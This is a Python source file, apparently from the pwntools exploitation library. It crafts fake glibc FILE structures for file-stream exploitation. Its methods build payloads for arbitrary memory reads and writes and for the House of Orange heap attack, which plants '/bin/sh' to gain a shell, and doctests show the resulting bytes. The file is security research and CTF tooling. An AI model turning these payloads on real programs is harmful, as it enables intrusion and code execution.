r"""
File Structure Exploitation

struct FILE (_IO_FILE) is the structure for File Streams.
This offers various targets for exploitation on an existing bug in the code.
Examples - ``_IO_buf_base`` and ``_IO_buf_end`` for reading data to arbitrary location.

Remembering the offsets of various structure members while faking a FILE structure can be difficult,
so this python class helps you with that. Example-

>>> context.clear(arch='amd64')
>>> fileStr = FileStructure(null=0xdeadbeef)
>>> fileStr.vtable = 0xcafebabe
>>> payload = bytes(fileStr)
>>> payload
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00'

Now payload contains the FILE structure with its vtable pointer pointing to 0xcafebabe

Currently only 'amd64' and 'i386' architectures are supported
"""

import ctypes

from pwnlib.context import context
from pwnlib.log import getLogger
from pwnlib.util.packing import pack, unpack

log = getLogger(__name__)

length=0
size='size'
name='name'

variables={
    0:{name:'flags',size:length},
    1:{name:'_IO_read_ptr',size:length},
    2:{name:'_IO_read_end',size:length},
    3:{name:'_IO_read_base',size:length},
    4:{name:'_IO_write_base',size:length},
    5:{name:'_IO_write_ptr',size:length},
    6:{name:'_IO_write_end',size:length},
    7:{name:'_IO_buf_base',size:length},
    8:{name:'_IO_buf_end',size:length},
    9:{name:'_IO_save_base',size:length},
    10:{name:'_IO_backup_base',size:length},
    11:{name:'_IO_save_end',size:length},
    12:{name:'markers',size:length},
    13:{name:'chain',size:length},
    14:{name:'fileno',size:4},
    15:{name:'_flags2',size:4},
    16:{name:'_old_offset',size:length},
    17:{name:'_cur_column',size:2},
    18:{name:'_vtable_offset',size:1},
    19:{name:'_shortbuf',size:1},
    20:{name:'unknown1',size:-4},
    21:{name:'_lock',size:length},
    22:{name:'_offset',size:8},
    23:{name:'_codecvt',size:length},
    24:{name:'_wide_data',size:length},
    25:{name:'_freeres_list',size:length},
    26:{name:'_freeres_buf',size:length},
    27:{name:'_pad5',size:length},
    28:{name:'_mode',size:4},
    29:{name:'_unused2',size:length},
    30:{name:'vtable',size:length}
}

del name, size, length


def _update_var(l):
    r"""
    Since different members of the file structure have different sizes, we need to keep track of the sizes. The following function is used by the FileStructure class to initialise the lengths of the various fields.

    Arguments:
        l(int)
            l=8 for 'amd64' architecture and l=4 for 'i386' architecture

    Return Value:
        Returns a dictionary in which each field is mapped to its corresponding length according to the architecture set

    Examples:

        >>> _update_var(8)
        {'flags': 8, '_IO_read_ptr': 8, '_IO_read_end': 8, '_IO_read_base': 8, '_IO_write_base': 8, '_IO_write_ptr': 8, '_IO_write_end': 8, '_IO_buf_base': 8, '_IO_buf_end': 8, '_IO_save_base': 8, '_IO_backup_base': 8, '_IO_save_end': 8, 'markers': 8, 'chain': 8, 'fileno': 4, '_flags2': 4, '_old_offset': 8, '_cur_column': 2, '_vtable_offset': 1, '_shortbuf': 1, 'unknown1': 4, '_lock': 8, '_offset': 8, '_codecvt': 8, '_wide_data': 8, '_freeres_list': 8, '_freeres_buf': 8, '_pad5': 8, '_mode': 4, '_unused2': 20, 'vtable': 8}
    """
    var={}
    for i in variables:
        var[variables[i]['name']]=variables[i]['size']
    for i in var:
        if var[i]<=0:
            var[i]+=l
    if l==4:
        var['_unused2']=40
    else:
        var['_unused2']=20
    return var

class IO_flags:
    _IO_MAGIC =         0xFBAD0000 # Magic number
    _IO_MAGIC_MASK =    0xFFFF0000
    _IO_USER_BUF =          0x0001 # Don't deallocate buffer on close.
    _IO_UNBUFFERED =        0x0002
    _IO_NO_READS =          0x0004 # Reading not allowed.
    _IO_NO_WRITES =         0x0008 # Writing not allowed.
    _IO_EOF_SEEN =          0x0010
    _IO_ERR_SEEN =          0x0020
    _IO_DELETE_DONT_CLOSE = 0x0040 # Don't call close(_fileno) on close.
    _IO_LINKED =            0x0080 # In the list of all open files.
    _IO_IN_BACKUP =         0x0100
    _IO_LINE_BUF =          0x0200
    _IO_TIED_PUT_GET =      0x0400 # Put and get pointer move in unison.
    _IO_CURRENTLY_PUTTING = 0x0800
    _IO_IS_APPENDING =      0x1000
    _IO_IS_FILEBUF =        0x2000
    _IO_USER_LOCK =         0x8000

class IO_flags2:
    _IO_FLAGS2_MMAP = 1
    _IO_FLAGS2_NOTCANCEL = 2
    _IO_FLAGS2_USER_WBUF = 8
    _IO_FLAGS2_NOCLOSE = 32
    _IO_FLAGS2_CLOEXEC = 64
    _IO_FLAGS2_NEED_LOCK = 128

class _FlagsUnionBase(ctypes.Union):
    def __getattr__(self, name):
        if any(name == field[0] for field in self._flags_bits._fields_):
            return getattr(self._flags_bits, name)
        return super().__getattr__(name)
    
    def __setattr__(self, name, value):
        if any(name == field[0] for field in self._flags_bits._fields_):
            setattr(self._flags_bits, name, value)
        return super().__setattr__(name, value)

    def __int__(self):
        return int(self._flags)

    def __str__(self):
        return "{:#x} ({})".format(self._flags, self._flags_bits)

# https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/libio.h#L66
class _IOFileFlags_bits(ctypes.LittleEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("_IO_USER_BUF", ctypes.c_uint8, 1), # Don't deallocate buffer on close.
        ("_IO_UNBUFFERED", ctypes.c_uint8, 1),
        ("_IO_NO_READS", ctypes.c_uint8, 1), # Reading not allowed.
        ("_IO_NO_WRITES", ctypes.c_uint8, 1), # Writing not allowed.
        ("_IO_EOF_SEEN", ctypes.c_uint8, 1),
        ("_IO_ERR_SEEN", ctypes.c_uint8, 1),
        ("_IO_DELETE_DONT_CLOSE", ctypes.c_uint8, 1), # Don't call close(_fileno) on close.
        ("_IO_LINKED", ctypes.c_uint8, 1), # In the list of all open files.
        ("_IO_IN_BACKUP", ctypes.c_uint8, 1),
        ("_IO_LINE_BUF", ctypes.c_uint8, 1),
        ("_IO_TIED_PUT_GET", ctypes.c_uint8, 1), # Put and get pointer move in unison.
        ("_IO_CURRENTLY_PUTTING", ctypes.c_uint8, 1),
        ("_IO_IS_APPENDING", ctypes.c_uint8, 1),
        ("_IO_IS_FILEBUF", ctypes.c_uint8, 1),
        ("_IO_BAD_SEEN__UNUSED", ctypes.c_uint8, 1), # No longer used, reserved for compat.
        ("_IO_USER_LOCK", ctypes.c_uint8, 1),
        ("_IO_MAGIC", ctypes.c_uint16, 16), # Magic number 0xFBAD0000.
    ]

    def __str__(self):
        return " | ".join(name for name, _, _ in self._fields_ if getattr(self, name))

class _IOFileFlags(_FlagsUnionBase):
    _fields_ = [
        ("_flags", ctypes.c_uint64),
        ("_flags_bits", _IOFileFlags_bits),
    ]


# https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/libio.h#L85
class _IOFileFlags2_bits(ctypes.LittleEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("_IO_FLAGS2_MMAP", ctypes.c_uint8, 1),
        ("_IO_FLAGS2_NOTCANCEL", ctypes.c_uint8, 1),
        ("_IO_FLAGS2_USER_WBUF", ctypes.c_uint8, 1),
        ("_IO_FLAGS2_NOCLOSE", ctypes.c_uint8, 1),
        ("_IO_FLAGS2_CLOEXEC", ctypes.c_uint8, 1),
        ("_IO_FLAGS2_NEED_LOCK", ctypes.c_uint8, 1),
    ]

    def __str__(self):
        return " | ".join(name for name, _, _ in self._fields_ if getattr(self, name))

class _IOFileFlags2(_FlagsUnionBase):
    _fields_ = [
        ("_flags", ctypes.c_uint64),
        ("_flags_bits", _IOFileFlags2_bits),
    ]


class FileStructure:
    r"""
    Crafts a FILE structure, with default values for some fields, like _lock which should point to null ideally, set.

    Arguments:
        null(int)
            A pointer to NULL value in memory. This pointer can lie in any segment (stack, heap, bss, libc etc)

    Examples:

        FILE structure with flags as 0xfbad1807 and _IO_buf_base and _IO_buf_end pointing to 0xcafebabe and 0xfacef00d

        >>> context.clear(arch='amd64')
        >>> fileStr = FileStructure(null=0xdeadbeeef)
        >>> fileStr.flags = 0xfbad1807 # or use flags by name:
        >>> fileStr.flags = IO_flags._IO_MAGIC | IO_flags._IO_USER_BUF | IO_flags._IO_UNBUFFERED | IO_flags._IO_NO_READS | IO_flags._IO_CURRENTLY_PUTTING | IO_flags._IO_IS_APPENDING
        >>> fileStr._IO_buf_base = 0xcafebabe
        >>> fileStr._IO_buf_end = 0xfacef00d
        >>> payload = bytes(fileStr)
        >>> payload
        b'\x07\x18\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00\r\xf0\xce\xfa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xee\xdb\xea\r\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xee\xdb\xea\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

        Check the length of the FileStructure

        >>> len(fileStr)
        224

        The definition for __repr__ orders the structure members and displays then in a dictionary format. It's useful when viewing a structure objet in python/IPython shell

        >>> q=FileStructure(0xdeadbeef)
        >>> q.flags = IO_flags._IO_MAGIC | IO_flags._IO_USER_BUF
        >>> q.flags._IO_TIED_PUT_GET = 1
        >>> q
        { flags: 0xfbad0401 (_IO_USER_BUF | _IO_TIED_PUT_GET | _IO_MAGIC)
         _IO_read_ptr: 0x0
         _IO_read_end: 0x0
         _IO_read_base: 0x0
         _IO_write_base: 0x0
         _IO_write_ptr: 0x0
         _IO_write_end: 0x0
         _IO_buf_base: 0x0
         _IO_buf_end: 0x0
         _IO_save_base: 0x0
         _IO_backup_base: 0x0
         _IO_save_end: 0x0
         markers: 0x0
         chain: 0x0
         fileno: 0x0
         _flags2: 0x0 ()
         _old_offset: 0xffffffffffffffff
         _cur_column: 0x0
         _vtable_offset: 0x0
         _shortbuf: 0x0
         unknown1: 0x0
         _lock: 0xdeadbeef
         _offset: 0xffffffffffffffff
         _codecvt: 0x0
         _wide_data: 0xdeadbeef
         _freeres_list: 0x0
         _freeres_buf: 0x0
         _pad5: 0x0
         _mode: 0x0
         _unused2: 0x0
         vtable: 0x0}

        Bytes fields are padded to the correct field size.
        For example, _unused2 is 40 bytes on i386, so a short value gets
        zero-padded to 40, not to context.bytes (4):

        >>> context.clear(arch='i386')
        >>> fileStr2 = FileStructure(null=0)
        >>> fileStr2.vtable = 0x561859f0
        >>> old_len = len(bytes(fileStr2))
        >>> fileStr2._unused2 = b'AB'
        >>> len(bytes(fileStr2)) == old_len
        True
    """

    vars_: list[str] = []
    length: dict[str, int] = {}

    def __init__(self, null=0):
            self.vars_ = [variables[i]['name'] for i in sorted(variables.keys())]
            self.setdefault(null)
            self.length = _update_var(context.bytes)
            self._old_offset = (1 << context.bits) - 1

    def __setattr__(self,item,value):
        if item in FileStructure.__dict__ or item in self.vars_:
            if hasattr(self, item) and isinstance(getattr(self, item), _FlagsUnionBase):
                if isinstance(value, (bytes, bytearray)):
                    getattr(self, item)._flags = unpack(value.ljust(context.bytes, b'\x00'))
                else:
                    getattr(self, item)._flags = value
            else:
                object.__setattr__(self,item,value)
        else:
            log.error("Unknown variable %r" % item)

    def __repr__(self):
        structure=[]
        for i in self.vars_:
            val = getattr(self, i)
            if isinstance(val, int):
                structure.append(" %s: %#x" % (i, val))
            else:
                structure.append(" %s: %s" % (i, val))
        return "{"+ "\n".join(structure)+"}"

    def __len__(self):
        return len(bytes(self))

    def __bytes__(self):
        structure = b''
        for val in self.vars_:
            if isinstance(getattr(self, val), bytes):
                structure += getattr(self, val).ljust(self.length[val], b'\x00')
            else:
                if self.length[val] > 0:
                    structure += pack(int(getattr(self, val)), self.length[val]*8)
        return structure

    def struntil(self,v):
        r"""
        Payload for stuff till 'v' where 'v' is a structure member. This payload includes 'v' as well.

        Arguments:
            v(string)
                The name of the field uptil which the payload should be created.

        Example:

            Payload for data uptil _IO_buf_end

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.struntil("_IO_buf_end")
            >>> payload
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        """
        if v not in self.vars_:
            return b''
        structure = b''
        for val in self.vars_:
            if isinstance(getattr(self, val), bytes):
                structure += getattr(self, val).ljust(self.length[val], b'\x00')
            else:
                structure += pack(int(getattr(self, val)), self.length[val]*8)
            if val == v:
                break
        return structure[:-1]

    def setdefault(self,null):
            self.flags=_IOFileFlags()
            self._IO_read_ptr=0
            self._IO_read_end=0
            self._IO_read_base=0
            self._IO_write_base=0
            self._IO_write_ptr=0
            self._IO_write_end=0
            self._IO_buf_base=0
            self._IO_buf_end=0
            self._IO_save_base=0
            self._IO_backup_base=0
            self._IO_save_end=0
            self.markers=0
            self.chain=0
            self.fileno=0
            self._flags2=_IOFileFlags2()
            self._old_offset=0
            self._cur_column=0
            self._vtable_offset=0
            self._shortbuf=0
            self.unknown1=0
            self._lock=null
            self._offset=0xffffffffffffffff
            self._codecvt=0
            self._wide_data=null
            self._freeres_list=0
            self._freeres_buf=0
            self._pad5=0
            self._mode=0
            self._unused2=0
            self.vtable=0

    def write(self,addr=0,size=0):
        r"""
        Writing data out from arbitrary memory address.

        Arguments:
            addr(int)
                The address from which data is to be printed to stdout
            size(int)
                The size, in bytes, of the data to be printed

        Example:

            Payload for writing 100 bytes to stdout from the address 0xcafebabe

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.write(addr=0xcafebabe, size=100)
            >>> payload
            b'\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00"\xbb\xfe\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00'
        """
        self.flags._IO_NO_WRITES = 0
        self.flags._IO_CURRENTLY_PUTTING = 1
        self._IO_write_base = addr
        self._IO_write_ptr = addr+size
        self._IO_read_end = addr
        self.fileno = 1
        return self.struntil('fileno')

    def read(self,addr=0,size=0):
        r"""
        Reading data into arbitrary memory location.

        Arguments:
            addr(int)
                The address into which data is to be written from stdin
            size(int)
                The size, in bytes, of the data to be written

        Example:

            Payload for reading 100 bytes from stdin into the address 0xcafebabe

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.read(addr=0xcafebabe, size=100)
            >>> payload
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00"\xbb\xfe\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        """
        self.flags._IO_NO_READS = 0
        self._IO_read_base = 0
        self._IO_read_ptr = 0
        self._IO_buf_base = addr
        self._IO_buf_end = addr+size
        self.fileno = 0
        return self.struntil('fileno')

    def orange(self,io_list_all,vtable):
        r"""
        Perform a House of Orange (https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c), provided you have libc leaks.

        Arguments:
            io_list_all(int)
                Address of _IO_list_all in libc.
            vtable(int)
                Address of the fake vtable in memory

        Example:

            Example payload if address of _IO_list_all is 0xfacef00d and fake vtable is at 0xcafebabe -

            >>> context.clear(arch='amd64')
            >>> fileStr = FileStructure(0xdeadbeef)
            >>> payload = fileStr.orange(io_list_all=0xfacef00d, vtable=0xcafebabe)
            >>> payload
            b'/bin/sh\x00a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfd\xef\xce\xfa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbe\xba\xfe\xca\x00\x00\x00\x00'
        """
        if context.bits == 64:
            self.flags = b'/bin/sh\x00'
            self._IO_read_ptr = 0x61
            self._IO_read_base = io_list_all-0x10
        elif context.bits == 32:
            self.flags = b'sh\x00'
            self._IO_read_ptr = 0x121
            self._IO_read_base = io_list_all-0x8
        self._IO_write_base = 0
        self._IO_write_ptr = 1
        self.vtable = vtable
        return self.__bytes__()
